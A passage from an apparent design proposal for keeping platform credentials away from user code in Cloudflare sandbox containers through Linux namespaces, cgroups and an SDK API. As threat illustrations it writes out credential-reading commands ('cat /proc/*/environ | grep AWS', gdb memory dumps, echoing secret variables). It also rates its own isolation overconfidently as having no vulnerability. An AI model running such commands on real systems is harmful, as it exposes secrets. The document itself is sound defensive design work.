  BPF_STMT(BPF_RET+BPF_K, SECCOMP_RET_ALLOW),
};
```

**Real-World Example:**
```typescript
// What we could do with custom seccomp:
const seccompRules = {
  allow: [
    'read',      // Can read files
    'write',     // Can write files
    'execve',    // Can run programs
  ],
  custom: [
    {
      syscall: 'open',
      rule: (path, pid) => {
        // Block reading other processes' environ
        if (path.match(/\/proc\/(\d+)\/environ/)) {
          const targetPid = RegExp.$1;
          return targetPid === pid;  // Only allow reading own environ
        }
        return true;
      }
    }
  ],
  block: [
    'ptrace',    // Cannot debug other processes
    'process_vm_readv',  // Cannot read other process memory
  ]
};
```

**Status in Production:** Seccomp is disabled (mode 0), but with namespace isolation this is less critical. Processes in different namespaces can't see each other anyway.

#### 3. cgroups v2 Delegation - "The Resource Manager"

**What it is:** Linux control groups v2 with delegation allows creating sub-groups with different permissions and visibility.

**In Simple Terms:** Like creating different security zones in an office building:
```
Current Reality (No cgroup delegation):
Container = Open office floor
├── Everyone can see everyone
├── Shared resources
└── No privacy

With cgroups v2 Delegation:
Container = Secure office building
├── Executive Floor (platform cgroup)
│   ├── AI Agent + AWS CLI
│   ├── Has keycard to vault (credentials)
│   └── Surveillance cameras can't see here
└── Public Floor (user cgroup)
    ├── User code runs here
    ├── No vault access
    └── Cannot access executive floor
```

**Technical Details:**
```bash
# With cgroup v2 delegation, we could:
# Create platform-trusted cgroup
mkdir /sys/fs/cgroup/platform-trusted
echo "+cpu +memory +pids" > /sys/fs/cgroup/platform-trusted/cgroup.subtree_control

# Configure isolation
echo "pids.max=100" > /sys/fs/cgroup/platform-trusted/pids.max
echo "memory.max=1G" > /sys/fs/cgroup/platform-trusted/memory.max

# Hide from user cgroup
echo "$$" > /sys/fs/cgroup/platform-trusted/cgroup.procs
```

**Real-World Example:**
```typescript
// What we could do with cgroup delegation:
class CGroupIsolation {
  async createTrustedGroup() {
    // Create isolated cgroup for AI agent
    await cgroup.create('platform-trusted', {
      pids: { max: 50 },
      memory: { max: '512M' },
      cpu: { shares: 1024 },
      // Key feature: process visibility
      hideFromOthers: true  // Other cgroups can't see these processes!
    });
  }
  
  async runInTrustedGroup(command: string) {
    const pid = fork();
    if (pid === 0) {
      // Move to trusted cgroup
      await cgroup.moveTo('platform-trusted');
      
      // Set credentials (only visible in this cgroup)
      process.env.AWS_ACCESS_KEY_ID = getSecret();
      
      // Run command
      exec(command);  // e.g., 'python3 ai_agent.py'
    }
    
    // Processes in 'user' cgroup cannot:
    // - See processes in 'platform-trusted'
    // - Access their resources
    // - Read their environment
  }
}
```

**Status in Production:** ✅ AVAILABLE - cgroups v2 with delegation is enabled!

#### 4. Linux User Namespaces - "The Identity Switcher"

**What it is:** Allows mapping users in the container to different users in the namespace.

**Status in Production:** ✅ AVAILABLE - User namespaces work in production!

### Production Reality vs Local Development

**Local Development Configuration:**
```yaml
# Local development (restricted for safety)
containers:
  sandbox:
    capabilities:
      drop: ["ALL"]  # Drop all capabilities first
      add: 
        - CAP_CHOWN
        - CAP_NET_BIND_SERVICE
        - CAP_SETUID
        # No CAP_SYS_ADMIN in local dev
    seccomp:
      profile: "default"  # Default Docker profile
    cgroups:
      version: 2
      delegation: false
```

**Production Configuration (CURRENT - DISCOVERED):**
```yaml
# Production reality - we have everything we need!
containers:
  sandbox:
    capabilities:
      # Full capabilities: 000001ffffffffff
      # This includes CAP_SYS_ADMIN and all others!
      add: ["ALL"]
    seccomp:
      mode: 0  # Disabled - no filtering
    cgroups:
      version: 2
      delegation: true  # Can create sub-cgroups
```

### Update: Production Has Everything We Need!

**Critical Discovery:** Testing in production revealed that Cloudflare Containers already have all the Linux capabilities we need, including CAP_SYS_ADMIN. We can implement complete isolation TODAY in production environments.

```bash
# Production reality check:
$ cat /proc/self/status | grep Cap
CapInh: 000001ffffffffff  # Full capabilities!
CapPrm: 000001ffffffffff  # Including CAP_SYS_ADMIN
CapEff: 000001ffffffffff  # Can create namespaces
CapBnd: 000001ffffffffff  # Can isolate processes

$ unshare --pid --fork echo "SUCCESS"
SUCCESS  # Works in production!

$ mkdir /sys/fs/cgroup/test
# Success - cgroup delegation works!
```

**Why Local Development is Different:**
Local development intentionally restricts capabilities for safety, preventing developers from accidentally compromising their machines. Production environments, running in secure VMs, have full capabilities enabled.

## Implementation Roadmap

### Phase 1: Proof of Concept (This Week)

Build and test namespace isolation using production's CAP_SYS_ADMIN:

1. **Core Namespace Implementation**
   ```typescript
   // Add to bun server (container_src/index.ts)
   async function execInIsolation(
     command: string, 
     credentials: Record<string, string>,
     options?: { timeout?: number }
   ) {
     // Create isolated namespace with credentials
     const child = spawn('unshare', [
       '--pid',    // Separate process namespace
       '--mount',  // Separate filesystem view
       '--fork',   // Fork before exec
       'sh', '-c', command
     ], {
       env: { ...minimalEnv(), ...credentials },
       timeout: options?.timeout || 60000
     });
     
     // Process invisible to main namespace
     return await collectOutput(child);
   }
   ```

2. **SDK Interface Design**
   ```typescript
   // New secure methods for platform developers
   interface SecureSandbox extends Sandbox {
     // Execute with isolated credentials
     execInIsolation(cmd: string, creds: Record<string, string>): Promise<ExecResult>;
     
     // Safe env vars for user code  
     setUserEnvVars(vars: Record<string, string>): Promise<void>;
     
     // Platform operations via RPC callback
     registerPlatformCallback(callback: Function): Promise<void>;
   }
   ```

3. **Testing in Production**
   - Deploy test worker with namespace isolation
   - Verify credential isolation with real AWS/GCP tools
   - Confirm process invisibility across namespaces

### Phase 2: Production Ready (Week 2-3)

1. **Harden Implementation**
   - Add cgroup isolation for resource limits
   - Implement audit logging for credential access
   - Create credential rotation mechanism
   
2. **Developer Experience**
   - Detect capabilities and provide appropriate warnings
   - Clear error messages when isolation fails
   - Automatic fallback for local development

3. **Documentation & Examples**
   - Complete API documentation
   - Migration guide from `setEnvVars()`
   - Example implementations for AWS, GCP, database deployments

### Phase 3: General Release (Week 4+)

1. **SDK Release**
   - Publish updated @cloudflare/sandbox package
   - Deprecation warnings for insecure patterns
   - Backward compatibility during transition

2. **Community Support**
   - Blog post explaining the security improvement
   - Video tutorials for migration
   - Support channels for questions

3. **Long-term Maintenance**
   - Monitor for security issues
   - Performance optimizations
   - Feature requests from users

## Security Analysis Summary

### Current State
- **Vulnerability:** All env vars accessible to all code
- **Exposure:** Persistent for container lifetime
- **Risk:** High - credentials can be exfiltrated

### With Container Control (What We Can Build)
- **Vulnerability:** Brief exposure during execution
- **Exposure:** Milliseconds to seconds
- **Risk:** Medium - timing attacks possible

### With Namespace Isolation (Available Today in Production!)
- **Vulnerability:** None - complete isolation
- **Exposure:** Zero - different namespaces
- **Risk:** Low - kernel-enforced boundaries

## Concrete Examples: What We Can't Do Today vs Tomorrow

### Scenario: AI Agent Needs to Deploy to AWS

#### Current State (Without Our Solution)
```python
# ai_agent.py running in container
import os
import subprocess

def deploy_lambda():
    # Option 1: Set credentials in environment (EXPOSED TO ALL!)
    os.environ['AWS_ACCESS_KEY_ID'] = get_from_vault()
    os.environ['AWS_SECRET_ACCESS_KEY'] = get_secret()
    
    # Now user code can steal them:
    # User runs: print(os.environ['AWS_ACCESS_KEY_ID'])
    # Result: "AKIAIOSFODNN7EXAMPLE" <- LEAKED!
    
    # Option 2: Don't set credentials (DEPLOYMENT FAILS!)
    result = subprocess.run(['aws', 'lambda', 'deploy'])
    # Result: "Unable to locate credentials" <- BROKEN!
```

**Reality Check:**
```bash
# Any user code can do this TODAY:
$ cat /proc/*/environ | grep AWS
AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE  # Found it!

$ ps aux | grep python
root 1234 python3 ai_agent.py  # Can see AI agent

$ gdb -p 1234
(gdb) dump memory  # Can read AI agent's memory!
```

#### What We're Building Today (With Namespace Isolation)
```python
# ai_agent.py running in isolated namespace (via our SDK)
import os
import subprocess

def deploy_lambda():
    # SDK ensures this runs in isolated namespace with credentials
    # Credentials exist ONLY in this namespace
    result = subprocess.run(['aws', 'lambda', 'deploy'])
    # Result: SUCCESS!
    
    # Meanwhile, user code in main namespace:
    # print(os.environ.get('AWS_ACCESS_KEY_ID'))  # None - not visible
    # subprocess.run(['cat', '/proc/1234/environ'])  # No such process
    # subprocess.run(['ps', 'aux'])  # Doesn't see isolated namespace!
```

**With Proper Isolation:**
```bash
# User code attempts to steal credentials:
$ cat /proc/*/environ | grep AWS
# (empty - can't see AI agent's namespace)

$ ps aux
PID  USER  COMMAND
5678 user  python3 user_code.py  # Only sees own processes!

$ ls /proc/
5678/  self/  # AI agent's PID not even visible!

$ gdb -p 1234
gdb: No such process  # Can't debug what you can't see!
```

### The Difference in Security Models

#### Without Our Solution: Time-Based Security
```typescript
// Brief exposure window - credentials visible for seconds
async function deployWithTempCreds() {
  // Credentials exposed for 30 seconds
  await sandbox.setEnvVars({ AWS_KEY: secret });
  await sandbox.exec('aws lambda deploy');
  // Still exposed until container restarts!
  
  // User code within those 30 seconds:
  await sandbox.exec('echo $AWS_KEY');  // Gotcha!
}
```

#### Our Solution Today: Namespace-Based Isolation (Production Ready)
```typescript
// Complete isolation using production CAP_SYS_ADMIN
async function deployWithIsolation() {
  // New SDK method that uses namespace isolation
  await sandbox.execInIsolation(
    'aws lambda deploy',
    { AWS_ACCESS_KEY_ID: secret, AWS_SECRET_ACCESS_KEY: secretKey },
    { timeout: 30000 }
  );
  
  // User code at ANY time:
  await sandbox.exec('echo $AWS_ACCESS_KEY_ID');  // Empty - never set in main namespace
  await sandbox.exec('ps aux | grep aws');  // No results - different PID namespace
  await sandbox.exec('cat /proc/*/environ | grep AWS');  // Nothing - isolated
}
```

## The Bottom Line

**Current State (Vulnerable):**
- Persistent credential exposure (hours/days) ❌
- Any code can read platform secrets
- No isolation between platform and user code
- **Risk**: Critical - credentials easily stolen

**What We Can Build Today (Production):**
- Complete namespace isolation ✅
- Kernel-enforced security boundaries
- Zero exposure to user code
- Platform operations in separate namespace
- **Risk**: Near zero - proper isolation

**Key Insights:**
1. Production has CAP_SYS_ADMIN - we can build proper isolation TODAY
2. No need to wait for platform changes
3. Local development is restricted for safety, production has full capabilities
4. Namespace isolation > Time-based security > Current persistent exposure

## Concrete Example: AI Code Generation Platform

### The Scenario
You're building "CodeGenie" - an AI-powered platform where users can prompt AI to build full applications.

### Current (Vulnerable) Implementation
```typescript
// Worker code - THIS IS INSECURE
export default {
  async fetch(request: Request, env: Env) {
    const { prompt } = await request.json();
    const sandbox = getSandbox(env.Sandbox, userId);
    
    // DANGER: Setting platform secrets
    await sandbox.setEnvVars({
      R2_ACCESS_KEY: env.R2_ACCESS_KEY,        // For fetching templates
      OPENAI_API_KEY: env.OPENAI_API_KEY,      // For AI features
      DATABASE_URL: env.DATABASE_URL,          // For storing projects
      STRIPE_SECRET_KEY: env.STRIPE_SECRET_KEY // For billing
    });
    
    // User/AI can now steal ALL these secrets!
    const aiResponse = await generateCode(prompt);
    await sandbox.exec(aiResponse.code);
    
    // If AI generates: console.log(process.env)
    // ALL secrets are exposed!
  }
}
```

### Attack Example
User prompt: "Create a Node.js app that shows system information"

AI innocently generates:
```javascript
// app.js - AI generated code
const express = require('express');
const app = express();

app.get('/info', (req, res) => {
  res.json({
    platform: process.platform,
    memory: process.memoryUsage(),
    environment: process.env  // EXPOSES ALL SECRETS!
  });
});

app.listen(3000);
```

### Proposed Secure Implementation Using RPC Callbacks

```typescript
// Worker code - Secrets stay here
export default {
  async fetch(request: Request, env: Env) {
    const { prompt } = await request.json();
    const sandbox = getSandbox(env.Sandbox, userId);
    
    // Leverage Cloudflare RPC callback capability!
    // DO can call back to Worker functions
    await sandbox.registerPlatformCallback(async (op, params) => {
      // This runs in Worker context with access to secrets
      switch(op) {
        case 'fetch-template':
          return await env.R2.get(params.templateId);
        
        case 'save-project':
          return await env.DB.prepare('INSERT INTO projects...').run(params);
        
        case 'deploy-aws':
          // Use AWS SDK with real credentials in Worker
          const lambda = new AWS.Lambda({
            accessKeyId: env.AWS_ACCESS_KEY,
            secretAccessKey: env.AWS_SECRET
          });
          return await lambda.updateFunctionCode(params).promise();
      }
    });
    
    // User code runs without any platform secrets
    const aiResponse = await generateCode(prompt);
    await sandbox.exec(aiResponse.code);
  }
}
```

### Real-World Impact

#### Without Fix
- Users can steal platform API keys
- Potential for massive bills (OpenAI, Stripe)
- Data breaches (database access)
- Platform reputation damage

#### With Fix
- Platform secrets completely isolated
- User code runs in clean environment
- Platform maintains control over privileged operations
- Clear security boundary

## Update: No Platform Changes Needed!

Our production testing revealed that Cloudflare Containers already provide all necessary Linux capabilities. We can build complete isolation without waiting for platform changes. The ask has shifted from "please enable these capabilities" to "let's document and leverage what's already available."

## The Original Ask to Cloudflare (For Reference)

### What We're Building
Platforms where AI agents autonomously execute operations requiring real credentials:
- Deploy code to AWS/GCP/Azure
- Run database migrations
- Execute terraform plans
- Manage Kubernetes clusters
- Integrate with third-party APIs

### The Problem
These tools (AWS CLI, terraform, kubectl) **cannot be modified** to use custom auth. They need standard environment variables or config files. Currently, this means exposing platform secrets to all container code, including untrusted user code.

### What We Need
Enable Linux security capabilities in the container runtime to create isolated execution contexts within containers. This is not about what software we install (Dockerfile) but about what the runtime allows us to do.

### Business Impact

**Without These Changes:**
- Platform developers must choose between:
  - Supporting critical tools (AWS CLI) with security risk
  - Perfect security but breaking essential functionality
- Limits adoption of Cloudflare Containers for AI platforms
- Forces workarounds that increase complexity

**With These Changes:**
- Cloudflare Containers become the ideal platform for AI agents
- Enables secure autonomous operations
- Opens new market opportunities in AI-powered DevOps

### What We Originally Thought We Needed
```yaml
# Container runtime configuration we thought was missing:
containers:
  sandbox:
    capabilities:
      add: [CAP_SYS_ADMIN]  # Already available in production!
    seccomp:
      profile: custom       # Can work with current mode 0
    cgroups:
      version: 2
      delegation: true      # Already enabled in production!
```

### Actual Next Steps (Updated)
1. Build POC implementation using existing production capabilities
2. Create SDK API for namespace-based isolation
3. Document patterns for secure credential management
4. Test with real-world deployment scenarios
5. Create migration guide for existing users

## Final API Design Considerations

### Why Two Contexts Instead of Per-Command Isolation?

We considered making isolation per-command:
```typescript
// Option 1: Per-command (what we considered)
await sandbox.execWithSecrets('aws s3 ls', { AWS_KEY: secret });
await sandbox.exec('python app.py');  // No secrets

// Option 2: Two contexts (what we chose)
await sandbox.platform.exec('aws s3 ls', { env: { AWS_KEY: secret }});
await sandbox.user.exec('python app.py');
```

We chose two contexts because:
1. **Mental Model**: Clear separation between platform and user operations
2. **Performance**: Can reuse namespaces for multiple platform operations
3. **State Management**: Platform operations can share state within their namespace
4. **Developer Experience**: Explicit about what has access to secrets

### Implementation Priority Order

1. **Core Namespace Isolation** (Week 1)
   - Basic `unshare` implementation in bun server
   - Separate platform/user execution paths
   - Test with real AWS CLI

2. **File System Sharing** (Week 1)
   - Shared directory mounting between namespaces
   - Ensure `/app` is accessible to both contexts
   - Handle file permissions correctly

3. **Process Management** (Week 2)
   - Track processes per namespace
   - Clean shutdown of namespace processes
   - Handle orphaned processes

4. **Developer Experience** (Week 2)
   - Clear error messages
   - Capability detection
   - Local development fallback

5. **Performance Optimization** (Week 3)
   - Namespace pooling/reuse
   - Lazy namespace creation
   - Benchmark overhead

### Edge Cases to Handle

1. **Large File Operations**
   ```typescript
   // Platform generates large file
   await sandbox.platform.exec('terraform plan -out=plan.tfplan');
   // User needs to read it - shared filesystem critical
   await sandbox.user.exec('terraform show plan.tfplan');
   ```

2. **Interactive Commands**
   ```typescript
   // Some tools need stdin
   await sandbox.platform.exec('aws configure', {
     stdin: `${key}\n${secret}\n${region}\ntext\n`
   });
   ```

3. **Long-Running Processes**
   ```typescript
   // Database tunnel needs to stay open
   const tunnel = await sandbox.platform.startProcess('ssh -L 5432:db:5432 bastion');
   // Multiple operations through tunnel
   await sandbox.platform.exec('psql -h localhost -p 5432');
   ```

4. **Cross-Context Communication**
   ```typescript
   // Platform generates, user consumes
   await sandbox.platform.exec('aws s3 cp s3://bucket/data.json /shared/data.json');
   await sandbox.user.exec('python analyze.py /shared/data.json');
   ```

### Security Considerations

1. **Namespace Escape**: Even with namespaces, monitor for kernel vulnerabilities
2. **Shared Filesystem**: Careful with permissions on shared directories
3. **Resource Limits**: Apply cgroup limits to prevent DoS
4. **Audit Logging**: Track all platform operations with credentials

### Alternative API Designs We Considered

#### Design 1: Explicit Namespace Management
```typescript
const platform = await sandbox.createNamespace('platform');
await platform.exec('aws s3 ls', { env: secrets });
await platform.destroy();
```
**Rejected**: Too complex for developers

#### Design 2: Role-Based Execution
```typescript
await sandbox.exec('aws s3 ls', { role: 'platform', env: secrets });
await sandbox.exec('python app.py', { role: 'user' });
```
**Rejected**: Not clear enough about isolation

#### Design 3: Capability Tokens
```typescript
const token = await sandbox.createCapabilityToken(['aws:*']);
await sandbox.exec('aws s3 ls', { token });
```
**Rejected**: Doesn't work with existing CLI tools

### What Success Looks Like

1. **Security**: Zero credential leaks in production
2. **Compatibility**: AWS CLI, terraform, kubectl all work
3. **Performance**: <10ms overhead for platform operations
4. **Developer Experience**: Migration takes <1 hour
5. **Reliability**: No crashes or hangs from namespace operations

---

*This document will be updated as we implement and test the proposed solutions.*